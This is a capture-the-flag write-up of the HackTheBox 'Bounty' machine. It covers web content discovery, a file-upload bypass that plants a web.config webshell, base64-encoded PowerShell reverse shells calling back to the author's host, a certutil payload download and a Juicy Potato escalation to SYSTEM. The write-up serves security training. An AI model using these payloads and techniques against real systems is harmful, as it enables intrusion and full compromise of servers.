# Bounty

## Introduction

Welcome to my another writeup! In this HackTheBox [Bounty](https://app.hackthebox.com/machines/Bounty) machine, you'll learn: Content discovery via `gobuster`, exploiting file upload vulnerbility & extension filter bypass, privilege escalation via abusing `SeImpersonatePrivilege` with Juicy Potato, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: merlin to NT AUTHORITY\\SYSTEM](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bounty/images/Bounty.png)

## Service Enumeration

**Create 2 environment variables for future use:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:28:26(HKT)]
└> export RHOSTS=10.10.10.93            
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:28:29(HKT)]
└> export LHOST=`ifconfig tun0 | grep -E 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]' | cut -d' ' -f10`
```

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:28:38(HKT)]
└> mkdir scanning; rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -Pn -oN scanning/rustscan.txt
[...]
Open 10.10.10.93:80
[...]
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
|_http-title: Bounty
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**`nmap` UDP port scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:28:47(HKT)]
└> sudo nmap -v -sU -Pn $RHOSTS -oN scanning/nmap-udp-top1000.txt
[...]
Not shown: 1000 open|filtered udp ports (no-response)
```

According to `rustscan` and `nmap` result, the target machine has 1 port is opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|80/TCP            | Microsoft IIS httpd 7.5       |

### HTTP on TCP port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:29:21(HKT)]
└> echo "$RHOSTS bounty.htb" | sudo tee -a /etc/hosts
10.10.10.93 bounty.htb
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bounty/images/Pasted%20image%2020230814143008.png)

Nothing weird. It just render a static image.

**Now, we can perform content discovery using tools like `gobuster` to find hidden directories and files:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:30:54(HKT)]
└> gobuster dir -u http://bounty.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 40
[...]
/.                    (Status: 200) [Size: 630]
/iisstart.htm         (Status: 200) [Size: 630]
/Transfer.aspx        (Status: 200) [Size: 941]
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:34:53(HKT)]
└> gobuster dir -u http://bounty.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40
[...]
/aspnet_client        (Status: 301) [Size: 155] [--> http://bounty.htb/aspnet_client/]
/uploadedfiles        (Status: 301) [Size: 155] [--> http://bounty.htb/uploadedfiles/]
/uploadedFiles        (Status: 301) [Size: 155] [--> http://bounty.htb/uploadedFiles/]
/UploadedFiles        (Status: 301) [Size: 155] [--> http://bounty.htb/UploadedFiles/]
/Aspnet_client        (Status: 301) [Size: 155] [--> http://bounty.htb/Aspnet_client/]
/aspnet_Client        (Status: 301) [Size: 155] [--> http://bounty.htb/aspnet_Client/]
[...]
```

- Found file: **`/Transfer.aspx`**
- Found directory: **`/uploadedfiles`**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bounty/images/Pasted%20image%2020230814143205.png)

In here, looks like we can upload some files.

## Initial Foothold

Whenever I deal with an upload functionality, I always look for file upload vulnerability. If it doesn't have any or weak validation on the uploaded file, **we can upload arbitrary files, including files that can execute arbitrary code!**

In the `nmap`'s script scan (`-sC`) result, we knew that the web server is using "**Microsoft IIS**". Also, based on the file extension of file  `Transfer.aspx`, the web application is written in **ASP.NET** framework.

**That being said,we can try to upload an ASPX (ASP.NET) webshell:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:33:20(HKT)]
└> cp /usr/share/webshells/aspx/cmdasp.aspx .
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bounty/images/Pasted%20image%2020230814143359.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bounty/images/Pasted%20image%2020230814143403.png)

Hmm... "Invalid File. Please try again". It seems like it validates the uploaded file.

**After poking around, it only accepts image files like `.jpg`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bounty/images/Pasted%20image%2020230814143738.png)

**Then, we can view the uploaded file in `/uploadedfiles/<filename>`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bounty/images/Pasted%20image%2020230814143743.png)

Now, in order to uploaded any files that we want, we need to bypass the validation. For example, **extension filter bypass**!

**After some trial and error, I found that the `.config` extension is allowed!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bounty/images/Pasted%20image%2020230814144207.png)

With that said, **we can execute arbitrary code via uploading `.config` files!**

In ASP.NET, the `web.config` is a file that is read by IIS and the [ASP.NET Core Module](https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/aspnet-core-module?view=aspnetcore-7.0) to configure an app hosted with IIS. (From [https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-7.0](https://learn.microsoft.com/en-us/aspnet/core/host-and-deploy/iis/web-config?view=aspnetcore-7.0))

According to [this blog post](https://soroush.me/blog/tag/remote-code-execution/), it is possible that **`web.config` can execute system commands**!

**Let's upload `web.config` webshell: (From [https://github.com/tennc/webshell/blob/master/aspx/web.config](https://github.com/tennc/webshell/blob/master/aspx/web.config))**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bounty/images/Pasted%20image%2020230814144420.png)

**Then, we should be able to run system commands via `/uploadedFiles/web.config` with `cmd` GET parameter:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:44:48(HKT)]
└> curl http://bounty.htb/uploadedFiles/web.config --get --data-urlencode "cmd=whoami"
[...]
<!--
-->bounty\merlin
<!--
-->
```

Nice!

**Let's get a reverse shell!**

- Setup a netcat listener:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:46:11(HKT)]
└> rlwrap -cAr nc -lvnp 443 
listening on [any] 443 ...
```

- Send the reverse shell payload: (Generated from [revshells.com](https://www.revshells.com/))

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:46:31(HKT)]
└> curl http://bounty.htb/uploadedFiles/web.config --get --data-urlencode "cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA5ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

> Note: The `/uploadedFiles/` directory's files will be cleaned up every 2 minutes.

- Profit:

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:46:11(HKT)]
└> rlwrap -cAr nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.93] 49157

PS C:\windows\system32\inetsrv> whoami; ipconfig /all
bounty\merlin

Windows IP Configuration

   Host Name . . . . . . . . . . . . : bounty
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-67-30
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.93(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
[...]
```

I'm user `merlin`!

**user.txt:**
```shell
PS C:\windows\system32\inetsrv> cd C:\
PS C:\> cmd /c dir "*user.txt*" /s
[...]
 Directory of C:\Users\merlin\AppData\Roaming\Microsoft\Windows\Recent

05/30/2018  11:32 PM               521 user.txt.lnk
               1 File(s)            521 bytes
[...]
PS C:\> type C:\Users\merlin\AppData\Roaming\Microsoft\Windows\Recent\user.txt.lnk
L?F?  ?e?ZU???e?ZU???e?ZU??db2?L? USERTX~1.TXT???L??L?*user.txt.txtS-R?0?PC:\Users\merlin\Desktop\user.txt.txt#..\..\..\..\..\Desktop\user.txt.txtC:\Users\merlin\Desktop(	?1SPS??XF?L8C???&?m?`?Xbounty?? J?H?f??k]=?j?$??c???
         )@??? J?H?f??k]=?j?$??c???
                                   )@?
```

```shell
PS C:\Users\merlin\Desktop\> type user.txt
{Redacted}
```

> Note: The `user.txt` is a hidden file.

## Privilege Escalation

### merlin to NT AUTHORITY\\SYSTEM

After gaining initial foothold on the target machine, we need to escalate our privilege. To do so, we need to enumerate the system.

**Check our current user's privilege:**
```shell
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Hmm... This user has `SeImpersonatePrivilege`.

> `SeImpersonatePrivilege` means that this privilege allows the account to impersonate other accounts, so long as they have authenticated. Whenever a user authenticates to a host, a token (logon sessions inside the **LSASS** process) resides on the system until the next restart. (From [https://juggernaut-sec.com/seimpersonateprivilege/](https://juggernaut-sec.com/seimpersonateprivilege/))

Maybe we can **leverage "Potato" exploit to escalate our privilege to SYSTEM**?

**Local users:**
```shell
PS C:\windows\system32\inetsrv> net user
[...]
-------------------------------------------------------------------------------
Administrator            Guest                    merlin                   
```

No local users other than `merlin`.

**System information:**
```shell
PS C:\windows\system32\inetsrv> systeminfo
[...]
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
[...]
System Type:               x64-based PC
[...]
```

- Windows version: **64-bit Windows Server 2008 R2 Datacenter Build 7600**

Armed with above information, **we can try to escalate our privilege to SYSTEM via potato exploit**!

According to [https://jlajara.gitlab.io/Potatoes_Windows_Privesc#tldr](https://jlajara.gitlab.io/Potatoes_Windows_Privesc#tldr), since this machine is < Windows 10 1809 < Windows Server 2019, we could use **[Juicy Potato](https://github.com/ohpe/juicy-potato/)**.

- **Transfer JuicyPotato to the target machine:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:52:19(HKT)]
└> file /opt/juicy-potato/JuicyPotato.exe
/opt/juicy-potato/JuicyPotato.exe: PE32+ executable (console) x86-64, for MS Windows, 7 sections
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:52:26(HKT)]
└> python3 -m http.server -d /opt/juicy-potato 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
PS C:\windows\system32\inetsrv> certutil -urlcache -split -f http://10.10.14.19/JuicyPotato.exe C:\windows\Temp\JuicyPotato.exe
[...]
CertUtil: -URLCache command completed successfully.
```

- **Test the JuicyPotato exploit:**

```shell
PS C:\windows\system32\inetsrv> C:\windows\Temp\JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -z -t *
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM
```

It worked, as it successfully impersonated as `NT AUTHORITY\SYSTEM` user!

- **Get a reverse shell as SYSTEM user:**

**Setup a netcat listener:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:55:36(HKT)]
└> rlwrap -cAr nc -lvnp 53 
listening on [any] 53 ...
```

**Run the JuicyPotato exploit with PowerShell reverse shell payload:**
```shell
C:\windows\Temp\JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p c:\windows\system32\cmd.exe -a "/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA5ACIALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" -t *
```

**Profit:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Bounty)-[2023.08.14|14:55:36(HKT)]
└> rlwrap -cAr nc -lvnp 53 
listening on [any] 53 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.93] 49168

PS C:\> whoami; ipconfig /all
nt authority\system

Windows IP Configuration

   Host Name . . . . . . . . . . . . : bounty
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-67-30
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.10.93(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 10.10.10.2
[...]
```

I'm `nt authority\system`! :D

## Rooted

**root.txt:**
```shell
PS C:\Users\Administrator\Desktop> type root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Bounty/images/Pasted%20image%2020230814150511.png)

## Conclusion

What we've learned:

1. Content discovery via `gobuster`
2. Exploiting file upload vulnerbility & extension filter bypass
3. Vertical privilege escalation via abusing `SeImpersonatePrivilege` with Juicy Potato